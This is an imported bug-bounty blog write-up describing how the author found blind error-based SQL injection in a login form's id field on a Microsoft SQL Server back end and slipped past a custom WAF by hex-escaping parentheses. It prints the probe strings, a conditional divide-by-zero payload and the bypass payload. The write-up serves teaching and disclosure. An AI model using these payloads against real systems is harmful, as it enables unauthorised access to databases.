---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-17_blind-sql-injection-with-a-little-waf.md
original_filename: 2023-07-17_blind-sql-injection-with-a-little-waf.md
title: Blind SQL injection with a little WAF
category: documents
detected_topics:
- idor
- sqli
- command-injection
- rate-limit
tags:
- imported
- documents
- idor
- sqli
- command-injection
- rate-limit
language: en
raw_sha256: 53aee0921149142b75968ff81d8528f5883391998fcd9a56f204bee7e0639f2f
text_sha256: cd8224e62a1cd2d32aeaf89bbb7134d9458b381143c685303573981042a1466c
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# Blind SQL injection with a little WAF

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-17_blind-sql-injection-with-a-little-waf.md
- Source Type: markdown
- Detected Topics: idor, sqli, command-injection, rate-limit
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `53aee0921149142b75968ff81d8528f5883391998fcd9a56f204bee7e0639f2f`
- Text SHA256: `cd8224e62a1cd2d32aeaf89bbb7134d9458b381143c685303573981042a1466c`


## Content

---
title: "Blind SQL injection with a little WAF"
url: "https://kair0s3.medium.com/blind-sql-injection-with-a-little-waf-871e69d06e2c"
authors: ["tb"]
bugs: ["Blind SQL injection", "WAF bypass"]
publication_date: "2023-07-17"
added_date: "2023-07-17"
source: "pentester.land/writeups.json"
original_index: 923
scraped_via: "browseros"
---

# Blind SQL injection with a little WAF

Top highlight

Blind SQL injection with a little WAF
tb
Follow
3 min read
·
Jul 17, 2023

81

2

My first ever security blog post, so pardon how I structure it haha. So here goes, for this story, I will be sharing about how I got rewarded my first ever bug using Blind SQL injection with a little bypass on a custom WAF.

Cool Injection image (?)

To set the context and to remove any references to the actual target application, we will call it example.com.

Initial Testing

At example.com, there was a typical login page and so I attempted to login and captured the request with Burp while authenticating.

Press enter or click to view image in full size
Login Page

In the request we could see something similar to below (Most of the non-relevant fields are redacted).

POST /login HTTP/2
Host: example.com
...

{
  "id":"TEST123456",
  "password":"<ENCRYPTED-PASSWORD>"
}

Seeing that the password was encrypted, I just went ahead to test for SQL injection on the id parameter. Below, we can see the values allowed me to identify the SQL injection vulnerability and potentially its SQL variant.

# Initial Payload
kair0s3' ==> Server Error Message

# Attempting to sanity check for SQL injection
kair0s3' # ==> Server Error Message
kair0s3' -- - ==> No Error message

# Narrowing down the SQL server used
kair0s3' || '123 ==> Server Error Message
kair0s3' + '123 ==> No Error Message

Through this, I was able to verify that 1) the SQL injection vulnerability most likely exists and 2) pretty sure this is a Microsoft SQL server, since it accepts -- as comments and allows for string concatenation with +.

Get tb’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

However, here we see that the server errors out when the syntax is wrong, but when it is valid, it always returns no error message. This presents us with another issue, we need to find a way to induce some sort of “condition” to infer whether the injected SQL statement is true or false.

Inducing Error in SQL injection

Since, the result of the injected SQL statement cannot be inferred visually, we could make use of a blind error-based SQL injection attack.

After running around online cheatsheets and some docs for Microsoft SQL, I came up with the following injection payload.

# This returns Server Error Message
# Because 'kair0s3' is not equals to 'h8d3s' and this results in 1/0
# And since division by zero is invalid, this errors out.
kair0s3' or (case when 'kair0s3'='h8d3s' then 1 else 1/0 end)=1 -- 

# This returns no errors at all!
kair0s3' or (case when 'kair0s3'='kair0s3' then 1 else 1/0 end)=1 --

Given that we now have a way to deduce if it is true or false based on the error being returned. With that we can just modify the injection payload to demonstrate the bug exists (by dumping out database version etc.)

But wait! There is still one last hurdle, remember that I mentioned a WAF earlier. So, we need to bypass that to run certain commands.

Bypassing the WAF

Testing the out different commands e.g. @@version, HOST_NAME()etc. It seemed that it was all blocked, even len(). So, I tried to escape certain characters to bypass the WAF starting with URL encoding.

# URL encoding (failed to bypass)
kair0s3' or (case when len%28'kair0s3'%29=7 then 1 else 1/0 end)=1 --

# Using Hex Escaping (SUCCESS!!)
kair0s3' or (case when len\x28'kair0s3'\x29=7 then 1 else 1/0 end)=1 --

And all of sudden the injection payload went through! From here, it was just enumeration of the database’s basic information as PoC of the bug.

Headspace

Honestly, I didn’t expect the bypass to actually work but hey, it did! And also, I learnt about how to properly induce a blind error based SQL injection on Microsoft SQL server which was nice to know ~

Press enter or click to view image in full size
